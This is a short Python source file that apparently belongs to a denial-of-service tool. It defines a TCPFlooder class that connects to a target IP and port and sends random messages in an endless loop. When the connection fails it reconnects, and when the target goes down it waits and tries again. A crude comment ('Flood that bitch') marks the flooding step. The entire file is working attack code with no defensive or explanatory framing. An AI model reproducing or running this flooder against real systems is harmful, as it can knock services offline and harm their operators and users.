import socket
import sys
from time import sleep
from role import flooder


class TCPFlooder(flooder.Flooder):
	def __init__(self, ip, port):
		flooder.Flooder.__init__(self, ip, port)
		self.socket_type = 1
		self.socket_protocol = 6
		self.socket_options = [
			{
				"level": 0,
				"option": 10,
				"value": 20
			}
		]

	def run(self):
		# Instantiate the socket
		s = socket.socket(socket.AF_INET, self.socket_type, self.socket_protocol)

		# Attempt to establish a connection
		try:
			s.connect((self.ip, int(self.port)))
		except socket.error:
			print("Socket error")
			sys.exit()

		# Flood that bitch
		try:
			while True:
				try:
					s.sendto(self.get_random_message(), (self.ip, int(self.port)))
				except socket.error:
					try:
						s.close()
						s = socket.socket(socket.AF_INET, self.socket_type)
						s.connect((self.ip, int(self.port)))
					except socket.error:
						print('Target down. Waiting %s seconds before reconnecting' % 10)
						sleep(10)
		except KeyboardInterrupt:
			sys.exit()
